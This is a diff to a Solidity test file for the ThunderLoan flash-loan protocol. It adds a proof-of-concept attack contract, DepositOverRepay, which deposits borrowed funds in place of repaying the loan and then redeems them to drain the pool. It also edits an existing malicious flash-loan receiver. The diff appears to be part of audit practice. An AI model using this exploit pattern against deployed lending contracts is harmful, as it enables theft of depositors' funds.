@@ -227,6 +227,59 @@ contract ThunderLoanTest is BaseTest {
         console.log("Attack Fee: ", attackFee);
         assert(attackFee < normalFeeCost);
     }
+
+    function testDepositInsteadToRepaytoStealFunds()
+        public
+        setAllowedToken
+        hasDeposits
+    {
+        vm.startPrank(liquidityProvider);
+
+        uint256 amountToBorrow = 50e18;
+        uint256 calculatedFee = thunderLoan.getCalculatedFee(
+            tokenA,
+            amountToBorrow
+        );
+        DepositOverRepay depositOverRepay = new DepositOverRepay(thunderLoan);  
+        tokenA.mint(address(depositOverRepay), calculatedFee);
+        thunderLoan.flashloan(
+            address(depositOverRepay),
+            tokenA,
+            amountToBorrow,
+            ""
+        );
+        depositOverRepay.redeemMoney();
+        vm.stopPrank();
+
+        assert(tokenA.balanceOf(address(depositOverRepay)) >= 50e18 + calculatedFee);
+    }
+}
+
+contract DepositOverRepay is IFlashLoanReceiver {
+    ThunderLoan thunderLoan;
+    AssetToken assetToken;
+    address s_token;
+
+    constructor(ThunderLoan _thunderLoan) {
+        thunderLoan = _thunderLoan;
+    }
+
+    function executeOperation(
+        address token,
+        uint256 amount,
+        uint256 fee,
+        address /* initiator */,
+        bytes calldata /* params */
+    ) external returns (bool) {
+        s_token = token;
+        assetToken = thunderLoan.getAssetFromToken(IERC20(address(token)));
+        IERC20(token).approve(address(thunderLoan), amount + fee);
+        thunderLoan.deposit(IERC20(token), amount + fee);
+    }
+
+    function redeemMoney() public {
+        thunderLoan.redeem(IERC20(s_token), type(uint256).max);
+    }
 }
 
 contract MaliciousFlashLoanReceiver is IFlashLoanReceiver {
@@ -268,7 +321,7 @@ contract MaliciousFlashLoanReceiver is IFlashLoanReceiver {
                 wethBought,
                 block.timestamp
             );
-            thunderLoan.flashloan(address(this), IERC20(token), 50e18, "");
+            thunderLoan.flashloan(address(this), IERC20(token), amount, "");
             // repay
             // IERC20(token).approve(address(thunderLoan), amount + fee);
             // thunderLoan.repay(IERC20(token), amount + fee);
